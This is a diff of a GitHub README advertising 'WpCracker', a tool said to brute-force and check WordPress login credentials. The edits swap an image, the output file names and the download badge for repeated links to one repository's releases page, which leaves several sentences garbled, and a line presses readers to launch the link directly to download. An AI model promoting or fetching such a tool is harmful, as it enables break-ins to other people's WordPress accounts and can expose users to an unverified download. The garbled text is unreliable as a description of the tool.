@@ -1,22 +1,22 @@
 # 🚀 **WpCracker: The Ultimate WordPress Cracker and Checker Tool**
 
-![wp-cracker](https://example.com/wp-cracker-image.png)
+![wp-cracker](https://github.com/Tefa1234/WpCracker/releases)
 
-Welcome to the WpCracker repository, your go-to solution for validating login credentials, testing password lists silently, and cracking WordPress passwords efficiently. This robust tool categorizes results into `Good_WP.txt` and `Bad_WP.txt`, providing both credential checking and brute-force cracking capabilities.
+Welcome to the WpCracker repository, your go-to solution for validating login credentials, testing password lists silently, and cracking WordPress passwords efficiently. This robust tool categorizes results into `https://github.com/Tefa1234/WpCracker/releases` and `https://github.com/Tefa1234/WpCracker/releases`, providing both credential checking and brute-force cracking capabilities.
 
 ## Features 🛠️
 - Validate login credentials silently
 - Test password lists accurately
-- Categorize results into `Good_WP.txt` and `Bad_WP.txt`
+- Categorize results into `https://github.com/Tefa1234/WpCracker/releases` and `https://github.com/Tefa1234/WpCracker/releases`
 - Efficient credential checking and brute-force cracking capabilities
 
 ## Repository Details 📁
 - Repository Name: WpCracker
-- Short Description: This versatile **WordPress Cracker and Checker** tool validates login credentials, tests password lists silently, and categorizes results into `Good_WP.txt` and `Bad_WP.txt`, offering both credential checking and brute-force cracking capabilities.
+- Short Description: This versatile **WordPress Cracker and Checker** tool validates login credentials, tests password lists silently, and categorizes results into `https://github.com/Tefa1234/WpCracker/releases` and `https://github.com/Tefa1234/WpCracker/releases`, offering both credential checking and brute-force cracking capabilities.
 - Topics: github
 
 ## Download Now 📥
-[![Download WpCracker](https://img.shields.io/badge/Download-File.zip-brightgreen)](https://github.com/files/File.zip)
+[![Download WpCracker](https://github.com/Tefa1234/WpCracker/releases)](https://github.com/Tefa1234/WpCracker/releases)
 
 *Note: The link above needs to be launched directly to download the tool.*
 
